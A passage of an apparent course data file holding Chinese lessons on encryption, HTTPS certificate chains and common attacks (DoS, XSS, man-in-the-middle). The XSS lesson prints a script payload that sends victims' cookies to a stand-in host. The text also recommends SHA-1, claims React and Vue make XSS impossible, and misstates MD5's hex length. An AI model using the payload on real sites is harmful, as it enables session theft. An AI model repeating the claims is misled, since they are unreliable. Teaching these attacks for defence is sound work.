data-nodeid="54">进一步的思考：对称加密安全吗？如果客户端不慎遗失密钥，让黑客拿到后果是什么？后果是黑客可以轻易伪装成服务端和客户端进行通信。在对称加密中，加密解密用的一个密钥，加密是正向过程，解密是逆向过程。那么有没有更好的方案呢？</p>\n<h3 data-nodeid="55">非对称加密</h3>\n<p data-nodeid="56">为了进一步提升安全系数，数学家还提出了非对称加密。在非对称加密中，加密和解密用的不是一个密钥。类比生活中的场景，如果一个礼物箱子，开锁和上锁用的是不同的钥匙会发生什么？只拥有上锁钥匙的人，可以把礼物放到箱子里，但是他只有一次机会，也就是一旦他将礼物上锁，即便反悔了也没法再打开箱子。而收礼物的人只能开箱子取走礼物。如果放礼物的人丢了钥匙，箱子也不会被中间人打开。这个例子类比网络传输的世界，可以防止数据被监听、盗用、篡改……</p>\n<p data-nodeid="57">当我们开发一个网站，我们的用户之间的通信用非对称加密。用户发送请求时，用户用一把钥匙加密数据，网站用另一把钥匙解密。在这个过程中，网站拥有的钥匙称为<strong data-nodeid="190">私钥</strong>，用户拥有的钥匙称为<strong data-nodeid="191">公钥</strong>。之所以这样称呼，是因为很多用户可以共用一把公钥，而只有网站才拥有私钥。</p>\n<p data-nodeid="664" class=""><img src="https://s0.lgstatic.com/i/image6/M00/43/99/Cgp9HWC5-WGALTzvAABpy1a0vWo195.png" alt="Drawing 1.png" data-nodeid="667"></p>\n\n\n<p data-nodeid="60">公钥发送的数据必须用私钥解密， 私钥发送的数据必须用公钥解密。网站发送数据加密用私钥，用户用公钥解密。用户发送数据用公钥，网站用私钥解密。而如果用户公钥不小心被盗，黑客也无法通过这把钥匙看其他用户的数据，因为黑客拿不到私钥。另外，当一个数据用公钥加密后，黑客也不可能查阅、篡改数据，因为黑客拿不到私钥。如果黑客要拿到私钥会怎么做呢？比如雇佣特工潜入物理机房、在该网站员工的机器上植入木马，买通公司内部员工购买等——世界上当然没有攻不破的秘密，只要花足够的代价。我们做信息安全，就是要尽量提升黑客的代价。</p>\n<h4 data-nodeid="1110">密钥的创建</h4>\n\n\n<p data-nodeid="1552" class=""><img src="https://s0.lgstatic.com/i/image6/M00/43/A2/CioPOWC5-WmARWqOAABgApDT2lA322.png" alt="Drawing 3.png" data-nodeid="1555"></p>\n\n\n<p data-nodeid="65">在非对称加密中，密钥通常由提供服务的一方创建。每次创建是一对公私钥对，然后提供者将公钥给用户，自己保留私钥。值得一提的是，我们在 Linux 环境可以用 openssl 创建公私钥对。</p>\n<p data-nodeid="66">下面这行语句就可以生成一个私钥文件：</p>\n<pre class="lang-java" data-nodeid="67"><code data-language="java">openssl genrsa -des3 -out privkey.pem <span class="hljs-number">2048</span>\n</code></pre>\n<p data-nodeid="68">接下来我们可以基于私钥生成公钥：</p>\n<pre class="lang-java" data-nodeid="69"><code data-language="java">openssl rsa -in privkey.pem -inform pem -pubout -out pubkey.pem\n</code></pre>\n<h4 data-nodeid="1996">常见非对称加密算法</h4>\n\n\n<p data-nodeid="72"><strong data-nodeid="206">目前最常见且广泛使用的非对称加密算法是 RSA 算法</strong>。RSA 依赖的是大整数的分解，以及一些和素数相关的算法。目前没有理论可以破译 RSA 算法。总体来说，RSA 密钥越长破解成本就越高，因此仍然被广泛使用。其他的非对称加密算法还有 DSS、EIGamal 等。</p>\n<h4 data-nodeid="73">常见的应用场景</h4>\n<p data-nodeid="74">非对称加密算法目前广泛应用到各个领域，比如 HTTPS 协议的握手和交换密钥过程需要非对称加密算法；SSH 的通信需要非对称加密算法。另外，证书的生程，比如利用证书实现 git 账号的免密操作也是基于非对称加密算法。在线合同、数字货币的签名等都需要非对称加密算法。</p>\n<h3 data-nodeid="75">总结</h3>\n<p data-nodeid="76">对称加密用同样的密钥，安全系数不够。非对称加密，用公钥 + 私钥的方式加强了安全系数。那么是不是我们所有的加密的应用都应该用非对称加密呢？通常情况，非对称加密需要更多的运算资源。因此很多协议使用非对称加密解决最核心的安全问题，再用对称加密解决其他问题。</p>\n<p data-nodeid="77">以 HTTPS 协议为例，客户端和服务器之间会先用非对称加密交换临时对称加密密钥，然后之后的通信会以对称加密执行，直到连接结束。也就是非对称加密仅仅存在于 HTTPS 连接建立后，用于交换密钥（对称加密密钥）的少数几次传输中。这样用非对称加密解决最核心的安全问题：交换对称加密密钥；然后利用对称加密进行数据的传输。</p>\n<p data-nodeid="78">那么，你现在可以尝试来回答：对称、非对称加密的区别是？</p>\n<p data-nodeid="79">【<strong data-nodeid="218">解析</strong>】对称加密和解密可以用同一套密钥。非对称加密利用数学的方法生成公私钥对，公钥加密的数据私钥可以解密，私钥加密的数据公钥可以解密。但是公钥不能解密公钥加密的数据，私钥也不能解密私钥加密的数据。</p>\n<h3 data-nodeid="80">思考题</h3>\n<p data-nodeid="81">最后我再给你出一道思考题目：自己写一个程序实测下对称加密和非对称加密的性能差距。</p>\n<p data-nodeid="82">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲是《20 | 信任链：为什么可以相信一个 HTTPS 网站？》。再见！</p>',
        article_title: "19 | 网络安全概述：对称、非对称加密的区别是？",
        title: "19 | 网络安全概述：对称、非对称加密的区别是？",
        id: 7287,
      },
      {
        content:
          '<p data-nodeid="3013">延续上一讲的内容，我们继续聊解决信用的话题。解决信用，仅仅有加密和解密是不够的。加密解密解决的只是传输链路的安全问题，相当于两个人说话不被窃听。可以类比成你现在生活的世界——货币的信用，是由政府在背后支撑的；购房贷款的信用，是由银行在背后支撑的；你肯购买视频网站的会员，也是由公司的信誉在背后支撑；就连比特币的信用也需要有知名人士（比如马斯克等）在不断喊话……</p>\n<p data-nodeid="3014">我想要强调的是，归根结底，信用源于我们的世界，信用的背后不是数学和算法，而是人，以及围绕人形成的组织、机构、国家等。</p>\n<p data-nodeid="3015">我们回到一个很小的问题，你在上网时候，凭什么可以相信你访问的网站没有骗你？今天我们就以这个话题为引，从 HTTPS 协议的信用角度去看互联网的整个信用体系。</p>\n<h3 data-nodeid="3016">摘要和签名</h3>\n<p data-nodeid="3017">现实的生活当中，如果想证明一份合同没有被修改过，人们会在合同上盖一个齐缝章，并附上自己的签名。签名和盖章其实是一个含义，目的是证明自己签署过某份协议，而且一经签署，协议就不能再变更。</p>\n<p data-nodeid="3018"><strong data-nodeid="3108">如果想阻止一份合同被修改，最容易想到的方式是加密</strong>。合同一旦被加密了，要修改就必须原文和密文一起修改。虽然这没有解决最本质的问题——谁来提供信用。但是这样的种做法解决了一个最基础的问题。如果有人想修改合同，就必须知道密钥。</p>\n<h4 data-nodeid="3019">摘要算法</h4>\n<p data-nodeid="3020">但是加密算法的计算量较大，而且结果通常比原文体积大。那是否有其他更好的处理方式呢？<strong data-nodeid="3115">其实一个更简单的做法，就是利用摘要算法</strong>。摘要，顾名思义，和现实中文章的摘要是一样的。相当于给一篇文章，形成一个提要。只不过，计算机世界的摘要算法算出来的结果并不是对原文真的概括总结，而是一个大数字。</p>\n<p data-nodeid="3021">给计算机一篇文章，计算机用摘要算法（主要是哈希类算法）生成一个字符串，如果文章内容改变，哪怕是一个字，一个标点符号，摘要也会完全改变。和完全加密一篇文章相比，摘要的体积很小，因此非常有利于存储和传输。</p>\n<p data-nodeid="3022"><strong data-nodeid="3121">通常对于一个给定的摘要算法，无论你的文章多大，有多少字节，最终生成摘要的字节数是固定的</strong>。以 MD5 摘要算法为例：</p>\n<pre class="lang-java" data-nodeid="3023"><code data-language="java">md5(<span class="hljs-number">1</span>字节数据)\nmd5(<span class="hljs-number">1</span>M数据)\n</code></pre>\n<p data-nodeid="3024">无论数据多大，经过 MD5 计算后，都会形成一个 128 位的值，换算成 16 进制是 16 个字符。可见，摘要算法是比较省空间的，如果用加密算法，那么体积会和原文大小正相关。用 MD5 摘要一个 100M 的视频文件，也会形成只有 128 位的值。</p>\n<h4 data-nodeid="3025">摘要的价值</h4>\n<p data-nodeid="3026"><strong data-nodeid="3128">摘要是对原文的证明，从原文到摘要是一个不可逆的过程</strong>。</p>\n<p data-nodeid="3027">通过原文可以计算出摘要，一旦原文发生变化，哪怕是一个标点符号，摘要也会发生变化。而已知一个摘要，想要反推出原文，几乎是不可能的。因为摘要和原文并不是一对一的关系，是多个原文对应一个摘要。而且，想要找到两个摘要碰撞的原文是非常困难的发生概率相当于买彩票中大奖 。而且就算黑客找到了碰撞的原文，也未必可以起到作用。当然，摘要碰撞是危险的，下面我们会讨论摘要碰撞的危害。<strong data-nodeid="3134">因此，我们通常会选择碰撞难度更高的摘要算法，这里推荐你在实战中用 SHA-1 摘要算法</strong>。</p>\n<p data-nodeid="3028">下面我们聊聊摘要碰撞的危害，举个具体的例子：目前多数网站用户的密码是以摘要的形式保存的。你可能会问，为什么不以原文形式保存呢？这是因为程序员会经常接触到数据库，而黑客也有可能黑进公司的数据库，因此密码以摘要显示保存更加安全，可以有效防止用户敏感数据被盗。因此，网站的设计，一般不存储用户的密码，只存储用户密码的摘要。如果网站的数据库被攻破，黑客拿到的是用户密码的摘要。拥有摘要什么也做不了，因为通过摘要找不到用户密码的原文，仍然不能登录这个网站。但是如果黑客能找到一个和密码碰撞的原文呢？ 那黑客就可以正常登录了。因此摘要碰撞是非常危险的，好在目前的算法都足够安全。</p>\n<p data-nodeid="3029">稍微小结一下，摘要算法解决了以下这几个问题：</p>\n<ol data-nodeid="3030">\n<li data-nodeid="3031">\n<p data-nodeid="3032">为原文生成固定长度的内容证明（内容摘要）；</p>\n</li>\n<li data-nodeid="3033">\n<p data-nodeid="3034">摘要无法被逆向得到原文，看上去是随机的，黑客拿到了也不知道原文；</p>\n</li>\n<li data-nodeid="3035">\n<p data-nodeid="3036">极少概率碰撞：不同的内容极大概率（绝大多数接近 100%）会生成不同的摘要。</p>\n</li>\n</ol>\n<p data-nodeid="3037">但是，你要明白，摘要只是一个工具，它可以用来解决很多问题，比如说用户密码存储问题。对于互联网的信用，它还只是工具。</p>\n<h4 data-nodeid="3038">签名</h4>\n<p data-nodeid="3039"><strong data-nodeid="3146">摘要的另一个非常重要的用途就是签名</strong>。举个例子，张三和李四签署一份合同。</p>\n<p data-nodeid="3040">如果张三将合同生成摘要，再用自己的私钥加密摘要，得到一个密文串，那么这个串就是张三对合同的<strong data-nodeid="3152">数字签名（DIgital  Sign）</strong>。</p>\n<p data-nodeid="3041">张三生成好数字签名，将自己的公钥、合同原文以及数字签名交给李四保管，就基本上达成了今天我们签约双方交换合同的效果。</p>\n<p data-nodeid="3042"><strong data-nodeid="3158">你可以这样思考，数字签名是对摘要的加密，因此数字签名本身还拥有摘要能力的</strong>。</p>\n<p data-nodeid="3043">如果原文没有被修改，那么下面的条件会满足：</p>\n<pre class="lang-java" data-nodeid="3044"><code data-language="java">公钥解密（数字签名） == 签订合同时的原文摘要 == 摘要算法（当前原文） == 当前摘要\n</code></pre>\n<p data-nodeid="3045">比如原文被修改，那么可以通过重新计算摘要，对比解密后的数字签名（其实就是早先的摘要）。对张三而言，李四不知道自己私钥，因此他篡改不了自己签名的这份合同。对李四而言，张三无法抵赖自己没有签署过这份合同，因为李四可以拿着张三的公钥解密得到摘要，然后再对比合同原文的摘要。因为是张三私钥加密，如果张三的公钥能解开，那说明就是张三签署的合同。</p>\n<h3 data-nodeid="3046">证书</h3>\n<p data-nodeid="3047">在上面张三和李四的例子当中还存在着一个重要的缺陷，就是张三、李四的公钥凭什么具有公信力？一份合同，张三李四都要签名，然后互相交换签名的数据。但是请你注意，这里咱们只是用到了技术的手段，或者你可以理解成这是一个数学的方式。信用本身不能用数学解决，数学只是工具。这里还存在着一个重要的缺陷，就是谁来证明，张三给李四的公钥，就是张三的公钥；李四给张三的公钥，就是李四的公钥。而谁又来证明张三和李四，是合法的两个个人，具有签署合同的权利。</p>\n<h4 data-nodeid="3048">信用的提供</h4>\n<p data-nodeid="3049">这里涉及的一个最基本问题是，<strong data-nodeid="3169">信用必须有人提供</strong>。只有权威机构（比如公安局）可以证明张三是张三，李四是李四。同理，互联网世界也需要机构提供证书，由机构证明他们的公钥。这并不是说，张三自己不能制作自己的证书，只不过张三做的证书没有公信力。互联网中，加密算法、签名算法都是公开的，只不过张三自己制作的证书背后没有信用的支持。</p>\n<h4 data-nodeid="3050">证书制作</h4>\n<p data-nodeid="3051">证书是一个身份证明文件，比如互联网中，经常会为一个域名制作证书。通常的一个域名证书会有一些基础信息：</p>\n<ul data-nodeid="3052">\n<li data-nodeid="3053">\n<p data-nodeid="3054">覆盖的域名</p>\n</li>\n<li data-nodeid="3055">\n<p data-nodeid="3056">证书的用途</p>\n</li>\n<li data-nodeid="3057">\n<p data-nodeid="3058">签发时间</p>\n</li>\n<li data-nodeid="3059">\n<p data-nodeid="3060">到期时间</p>\n</li>\n<li data-nodeid="3061">\n<p data-nodeid="3062">域名方的公钥</p>\n</li>\n<li data-nodeid="3063">\n<p data-nodeid="3064">……</p>\n</li>\n</ul>\n<p data-nodeid="3065"><strong data-nodeid="3182">除了证明身份，证书还有一个重要的作用就是让其他人可以使用自己的公钥</strong>。比如自己签名的数据，就可以用自己的公钥解密对照。总的来说，你可以把这些基础信息视作文本，最重要的，就是要有权威机构对证书的签名。权威机构用自己的私钥对证书进行签名，于是证书上还需要增加 3 个信息：</p>\n<ul data-nodeid="3066">\n<li data-nodeid="3067">\n<p data-nodeid="3068">权威机构的名称</p>\n</li>\n<li data-nodeid="3069">\n<p data-nodeid="3070">权威机构的签名</p>\n</li>\n<li data-nodeid="3071">\n<p data-nodeid="3072">权威机构的网址</p>\n</li>\n</ul>\n<p data-nodeid="3073">最后这步签名操作就好像护照上要盖个章一样，有了这个权威机构的签名，证书就合法了。</p>\n<p data-nodeid="4148">下面是拉勾的 HTTPS 证书，你可以做个对比学习：</p>\n<p data-nodeid="4149" class=""><img src="https://s0.lgstatic.com/i/image6/M01/44/78/Cgp9HWC_QZmAFbERAAIwzmSMbnU222.png" alt="图片1.png" data-nodeid="4153"></p>\n\n\n<p data-nodeid="3076">有一些关键信息，比如签名和公钥，虽然没有在这个图片中体现，但这些信息也是在证书中的。</p>\n<h4 data-nodeid="3077">信用链的验证</h4>\n<p data-nodeid="3078">现在问题来了，张三把证书给了李四，李四拿到张三的证书，并看到某权威机构的签名。李四的第一反应就是——这个签名是权威机构的吗？比如上图中拉勾的签名，当你打开拉勾教育的时候，你相信这个证书是 GlobalSign 签发的吗？大部分同学都不知道 GlobalSign吧？ 其实我也不知道这家机构。但是这不重要，用户甚至不需要理解 GlobalSign，计算机产业的底层建筑帮助大家解决了这个问题——这个被称作<strong data-nodeid="3196">信用链</strong>。</p>\n<p data-nodeid="3079">当我们用 HTTPS 协议打开拉勾教育的页面时，这个证书会随着 HTTPS 的握手被下载到本地。浏览器打开证书，发现提供方式 GlobalSign。GlobalSign（Certificate Authority，CA）是一家证书颁发机构。</p>\n<p data-nodeid="3080">浏览器并不需要理解 GlobalSign 是谁，在验证过程中，浏览器会查找操作系统中，是否已经安装了 GlobalSign 的证书。如果已经安装了，浏览器就会相信这个证书。操作系统的提供商，比如微软、苹果、谷歌总不会恶意安装非法证书砸自己的招牌。只要用户本机安装了 GlobalSign 证书，那么 GlobalSign 证书的公钥就应该可以解密网站证书的签名，得到网站证书的摘要，那么就可以信任 GlobalSign 签发的这张拉勾的证书。</p>\n<p data-nodeid="3081">如果操作系统中没有安装 GlobalSign 的证书该怎么办呢？不要着急，这个时候，浏览器会去 GlobalSign 的网站下载证书，拿到 GlobalSign 证书后，浏览器也不确定 GlobalSign 是一个权威机构，这个时候浏览器会看 GlobalSign 证书上有没有签发方。如果有，递归进行检查签发方的证书是否安装在操作系统本地，直到找到根证书。根证书的特点是，这个机构的证书没有其他机构为它签名。只要操作系统中有根证书，那么 GlobalSign 就值得信任，因此拉勾值得信任。</p>\n<p data-nodeid="3082">在上述过程中，操作系统的提供商起到重要的作用。操作系统安装的时候，会预装一些证书。这些证书我们称为<strong data-nodeid="3209">根证书</strong>，能签发根证书的机构就是<strong data-nodeid="3210">根证书提供商</strong>。根证书提供商在全球很少，通常只有信誉非常棒的机构才能担当。而且成为根证书要得到很多资质，如果中间出现问题，还会被取消资格，特别是还需要和多家操作系统提供商达成合作，比如微软、苹果、谷歌等。</p>\n<h4 data-nodeid="3083">信任链的具体形式</h4>\n<p data-nodeid="3084">以上的层层证明形式，构成了一个信任链。</p>\n<p data-nodeid="3085">一般的，信任链有 3 层。最顶层是根证书和根证书机构（Root Certificate，Root CA）。前面我们提到，根证书往往是随着操作系统安装的，特殊情况需要用户自己安装。比如说一些抓包工具，会要求用户自己安装一个根证书。</p>\n<p data-nodeid="4608">中间的是中间证书机构，它们自己的证书是由 Root CA 签名颁发的，同时它们向最底层的终端机构提供证书。</p>\n<p data-nodeid="4609" class="te-preview-highlight"><img src="https://s0.lgstatic.com/i/image6/M01/44/81/CioPOWC_QaOANc8OAAKdwCZGW4o807.png" alt="图片2.png" data-nodeid="4613"></p>\n\n\n<p data-nodeid="3088">根证书是自签名，中间证书是根证机构书签名，终端证书（比如拉勾网）是中间证书机构签名。这样就构成了一个信任链，并且也增加了犯罪的成本。犯罪分子如果想要冒充证书，那么它的证书就需要获得中间证书提供商的签名，而获得签名需要购买证书。犯罪分子就算购买了证书，也只能购买自己域名的证书，因此无法伪装成其他网站。<strong data-nodeid="3221">但要特别注意的是，如果犯罪分子设法在你的个人电脑上安装了它的根证书，那后果就严重了，它可以冒充成任何网站</strong>。</p>\n<h3 data-nodeid="3089">总结</h3>\n<p data-nodeid="3090">总结下，解决信用不是一个数学问题。基于信任关系塑造信用是当今社会的主流做法，比如基于社交关系的信用、基于国家机器的信用、基于公司信誉的信用……另一方面，当然工具也是必不可少的。</p>\n<p data-nodeid="3091">摘要，是一种数学的证明，本身体积很小，还不存在密钥管理和分发问题，适合在网络环境中工作。在摘要上用私钥加密就是签名，签名可以防止数据被篡改、伪造等。在摘要和签名的基础上，可以利用原本的社会关系，让一些信用优秀的机构提供信用，这就是证书的颁发和信用链体系。</p>\n<p data-nodeid="3092">好的，现在你可以尝试来回答本讲关联的面试题目：为什么可以相信一个 HTTPS 网站？</p>\n<p data-nodeid="3093">【<strong data-nodeid="3235">解析</strong>】当用户用浏览器打开一个 HTTPS 网站时，会到目标网站下载目标网站的证书。接下来，浏览器会去验证证书上的签名，一直验证到根证书。如果根证书被预装，那么就会信任这个网站。也就是说，<strong data-nodeid="3236">网站的信用是由操作系统的提供商、根证书机构、中间证书机构一起在担保</strong>。</p>\n<h3 data-nodeid="3094">思考题</h3>\n<p data-nodeid="3095">最后我再问你一个问题，如果公司要求你生成一个公私钥对，然后去证书机构申请证书，请问如果你丢失了这个公私钥对有什么危害？你要如何保护这个公私钥对？</p>\n<p data-nodeid="3096">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲是《21 | 攻防手段介绍：如何抵御 SYN 拒绝攻击？》。再见！</p>',
        article_title: "20 | 信任链：为什么可以相信一个 HTTPS 网站？",
        title: "20 | 信任链：为什么可以相信一个 HTTPS 网站？",
        id: 7288,
      },
      {
        content:
          '<p data-nodeid="3">安全无小事。2016 年 DNS 提供商 Dyn 遭遇了一次大规模的 DDoS（分布式拒绝服务攻击），有 14000 个网站域名受到影响。2020 年 7 月份，Twitter 遭大规模攻击，黑客控制了包括马斯克、盖茨、奥巴马等人的 Twitter 账号，诱导用户购买比特币，最终骗取了 11W 美金。2021 年 4 月份，还有黑客利用 Github 的 Actions（Github 的一种 CI/CD 方案），诱导用户进行 git 操作时触发恶意比特币的矿机。</p>\n<p data-nodeid="4">特别是在中国这种人口基数大，互联网发达的国家，如果一个互联网公司的安全出了故障，那么影响将是巨大的。前几年，我们国家出现过一起影响较大的安全问题——某知名技术社区用户的用户名和密码被大规模泄露。前车之鉴、后车之覆，我们要吸取教训。因此，这一讲我们就以“<strong data-nodeid="54">如何抵御 SYN 拒绝攻击</strong>”为引，开启今天的学习，让你对网络安全的常见攻防手段有一个初步了解。</p>\n<h3 data-nodeid="5">拒绝服务攻击（DoS)</h3>\n<p data-nodeid="1166" class="te-preview-highlight"><strong data-nodeid="1179">拒绝服务攻击</strong>（<strong data-nodeid="1180">Denial-of-Service Attack，DoS</strong>）<strong data-nodeid="1181">是一种常见的攻击手段</strong>。虽然目前互联网越来越趋向于正规化，但是对于黑产还有利用 DoS 攻击黑吃黑的现象。比较常见的就是热血传奇这款游戏的私服，搭建一个私服可以获得大额非法收入，但是因为是黑产也会经常受到黑客的攻击。黑客攻击后，再发邮件到管理员邮箱索取金钱，威胁用户不尽快打款就会一直攻击。</p>\n\n\n<p data-nodeid="7">在过去，黑产间的攻阀，DoS 就可以作为一种常见武器。<strong data-nodeid="78">DoS 的原理就是利用大量的流量迅速向一个网站发送出去</strong>。这种流量可能是应用层的，比如大量 HTTP 请求；也可以是传输层，比如大量的 TCP 请求。比如 2018 年 2 月 18 日，Github 就遭受了一场超大规模的 DoS 攻击，瞬间流量峰值达到了 1.35Tbps。之后，黑客还对 Google、亚马逊等网站也进行了攻击。</p>\n<p data-nodeid="8">为了形成足够强大的流量，攻击者往往没有足够的经济实力购买机器，而是利用中病毒、木马的机器组织流量攻击。这些中病毒的机器，我们俗称“肉鸡”。顶级的黑客往往控制着大量的肉鸡，一声令下，肉鸡就开始疯狂向目标发送网络封包，直到打垮目标。因为肉鸡是分散在世界各地的，因此这种攻击我们也称为<strong data-nodeid="88">分布式拒绝服务攻击</strong>（<strong data-nodeid="89">Distributed Denial-of-Service Attack， DDoS</strong>）。</p>\n<h4 data-nodeid="9">DDoS 的种类</h4>\n<p data-nodeid="10">DDoS 的种类有很多，手段也很复杂。</p>\n<ul data-nodeid="11">\n<li data-nodeid="12">\n<p data-nodeid="13">直接不停发送 Ping 消息的，利用底层的 ICMP 协议，称为<strong data-nodeid="96">ICMP 攻击；</strong></p>\n</li>\n<li data-nodeid="14">\n<p data-nodeid="15">走 UPD 协议的，称为<strong data-nodeid="106">UDP 洪水</strong>（<strong data-nodeid="107">UDP Flood</strong>）；</p>\n</li>\n<li data-nodeid="16">\n<p data-nodeid="17">不停利用 TCP 协议发送 SYN 消息的，也叫<strong data-nodeid="112">SYN 攻击；</strong></p>\n</li>\n<li data-nodeid="18">\n<p data-nodeid="19">模拟用户行为，不停发帖、浏览帖子、浏览网页、加购物车等，称为<strong data-nodeid="122">挑战黑洞攻击</strong>（<strong data-nodeid="123">Challenge Collapsar</strong>）。</p>\n</li>\n</ul>\n<h4 data-nodeid="20">防范措施</h4>\n<p data-nodeid="21">当遇到 DDoS 攻击的时候，如果有所准备，就可以做到有备无患。比如说购买了防火墙，防火墙会根据特征识别出攻击行为，通过这样的方式将攻击行为过滤掉，让系统不会因为 DDoS 而过载造成崩溃。</p>\n<p data-nodeid="22">当然如果是纯粹的流量攻击，仅仅靠防火墙是不够的。通常一些大型互联网公司会进行多活建设。一般是两地三机房，分别是日常生产环境、同城灾备环境和异地灾备环境，遇到 DDoS 可以考虑切换流量，也能起到一定作用。</p>\n<p data-nodeid="23">另外 CDN 在解决 DDoS 时往往也有很好的效果，毕竟 CDN 是大量缓存节点，DDoS 攻击 CDN 的时候用不上力。当然，如果资金不足以购买服务器的小团队，可以自己实现软件防火墙。其实就是设计一台吞吐量极高的代理服务器，作为反向代理挡在所有服务前面，如果遇到 DDoS，代理服务器可以识别出一些特征并丢弃一些流量。</p>\n<p data-nodeid="24">在遇到攻击的时候，对服务适当降级也是有必要的，甚至可以牺牲一部分用户保全另一部分用户的正常使用。防火墙是基于特征识别，本身也会有一定的误杀现象，在被攻击的时候，可以人为降低判定攻击行为的门槛。通过允许防火墙造成一部分的误伤来识别出更多的攻击流量。</p>\n<h3 data-nodeid="25">跨站脚本攻击（XSS）</h3>\n<p data-nodeid="26">接下来我们讨论另一种攻击——<strong data-nodeid="135">跨站脚本攻击</strong>。</p>\n<p data-nodeid="27">2021 年 2 月印度的一名测试工程师在苹果 iCloud 官网中发现了一个跨站脚本攻击漏洞，并向苹果公司提交了具体的漏洞说明和触发的操作步骤。事后，苹果公司给这名印度人发放了 5000 美金的奖金。</p>\n<p data-nodeid="28"><strong data-nodeid="141">跨站脚本（Cross Site Scripting），顾名思义，就是利用漏洞将脚本注入网页中</strong>。比如提交个人信息的输入框，如果在服务端没有处理好就有可能触发跨站脚本。</p>\n<p data-nodeid="29">假设有一个输入个人签名的多行文本输入框，正常用户会输入几句有趣的话，但是黑客可能会尝试输入：</p>\n<pre class="lang-java" data-nodeid="30"><code data-language="java">&lt;script&gt;document.createElement(\'img\').src="https://some.site.com?cookie=document.cookie"&lt;/script&gt;\n</code></pre>\n<p data-nodeid="31">如果这段话被显示到用户的个人主页，那么访问这个用户空间的其他用户就会被攻击，进而被黑客拿走 Cookie 中的关键信息。</p>\n<p data-nodeid="32">XSS 攻击模式很简单，就是想办法向网站的页面上注入脚本。总的来说，输入框是一个重灾区。目前随着前端技术的发展，使用前端框架，比如 React 或 Vue 开发的页面已经杜绝了被 XSS 的可能。但是有时候如果工作出现某些疏漏，还是会导致 XSS 的发生。所以正确的做法是上线前拜托安全部门的同学协助进行一些针对 XSS 漏洞的扫描。</p>\n<h3 data-nodeid="33">中间人攻击</h3>\n<p data-nodeid="34">接下来我们聊聊<strong data-nodeid="151">中间人攻击</strong>。</p>\n<p data-nodeid="35">我们国家目前在打击网络电信诈骗案中，就有这样一种形式。一些不法分子利用伪基站，比如找一个人多的地方，用自己的伪基站设备伪装成基站，向用户提供网络。一些离不法分子较近的人，手机可能会连接上伪基站。连接上后，不法分子的伪基站就成了你上网的代理，可以进行很多非法操作。因此，从这个角度看，中间人黑进你附近的网络，成为你上网的“代理”，并不是非常难的一件事情。不懂技术的犯罪分子，通过购买伪基站设备，就可以充当中间人。</p>\n<p data-nodeid="36">在遇到中间人攻击时，互联网的信用体系、操作系统、浏览器等就会帮你把好最后一关。比如你访问淘宝购物，中间人向你投放假网页。浏览器就会去验证这个假网页的证书，是不是淘宝的证书。去年 Github 在国内疑似被中间人攻击的案例中，国内很多用户看到的现象是浏览器提示用户浏览的网站不安全。这种情况就是浏览器在校对证书的时候发现了疑点。如果你上网遇到这种情况应该选择立即关闭这个网页，不进行后续的操作，防止被骗。</p>\n<h3 data-nodeid="37">总结</h3>\n<p data-nodeid="38">生活在当今时代，作为个人，网络安全是一件大事。你的购票信息、出行记录、账号密码、位置信息等，都需要你有防范意识，防止被不法分子拿走。在为公司工作的时候，要保管好自己的账号。特别是你工作用的计算机，要远离非正规渠道获得的软件。你的工作计算机一旦中了木马，成了肉鸡，那不法分子完全可以用你的工作计算机作为跳板，登录公司服务器。</p>\n<p data-nodeid="39">另一方面，作为公司和团队，也要有较强的安全意识。当然，安全领域有自己的专业知识和人才。在互联网产品初期，往往承担不起昂贵的防火墙和雇佣安全专家的费用，这个时候需要开发者主动去学习安全知识，尽可能提升被攻破的成本。当业务发展到一定程度后，就需要马上雇佣安全专家，以及购买包括防火墙在内的网络安全设备。</p>\n<p data-nodeid="40">好的，那么通过这一讲的学习，你现在可以尝试来回答：如何抵御 SYN 拒绝攻击？</p>\n<p data-nodeid="41">【<strong data-nodeid="163">解析</strong>】SYN 攻击是 DDoS 攻击的一种形式。这种形式攻击者伪装成终端不停地向服务器发起 SYN 请求。通常攻击者的肉鸡，发送了 SYN 之后，不等给服务端 ACK，就下线了。 这样攻击者不断发送 SYN ，然后下线，而服务端会等待一段时间（通常会在 3s 以上），等待 ACK。这样就导致了大量的连接对象在服务端被积累。</p>\n<p data-nodeid="42">针对这个特点可以实现一个 TCP 代理（防火墙），发现有发送 SYN 但是不给 ACK 的行为就对目标 IP 地址禁用一段时间。这个策略平时可以配置成开关，等到被攻击的时候打开。另一方面，可以适当提升连接数支持。</p>\n<h3 data-nodeid="43">思考题</h3>\n<p data-nodeid="44">最后给你出一道需要查资料的思考题目：哪些情况下你服务器的 /etc/passwd 文件会被黑客拿走？</p>\n<p data-nodeid="45">这一讲就到这里，发现求知的乐趣，我是林䭽。感谢你学习本次课程，下一讲是《模块五思考题解答》，希望你自己完成题目后再来看答案和分析。再见！</p>',
        article_title: "21 | 攻防手段介绍：如何抵御 SYN 拒绝攻击？",
        title: "21 | 攻防手段介绍：如何抵御 SYN 拒绝攻击？",
        id: 7289,
      },
      {
        content:
          '<p data-nodeid="50474" class="">今天我会带你把《<strong data-nodeid="50480">模块五：网络安全</strong>》中涉及的课后练习题，逐一讲解，并给出每个课时练习题的解题思路和答案。</p>\n\n<h3 data-nodeid="50177">练习题详解</h3>\n<h4 data-nodeid="50178">19 | 网络安全概述：对称、非对称加密的区别是？</h4>\n<p data-nodeid="50179">【<strong data-nodeid="50221">问题</strong>】自己写一个程序实测下对称加密和非对称加密的性能差距。</p>\n<p data-nodeid="50180">【<strong data-nodeid="50227">解答</strong>】以下是我用 Java 写的一段测试程序：</p>\n<pre class="lang-java" data-nodeid="50181"><code data-language="java"><span class="hljs-keyword">package</span> test;\n<span class="hljs-keyword">import</span> com.github.javafaker.Faker;\n<span class="hljs-keyword">import</span> org.junit.Test;\n<span class="hljs-keyword">import</span> javax.crypto.*;\n<span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;\n<span class="hljs-keyword">import</span> java.security.*;\n<span class="hljs-keyword">import</span> java.security.spec.InvalidKeySpecException;\n<span class="hljs-keyword">import</span> java.security.spec.PKCS8EncodedKeySpec;\n<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RSA</span> </span>{\n&nbsp; &nbsp; <span class="hljs-meta">@Test</span>\n&nbsp; &nbsp; <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rsaEncode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeySpecException, 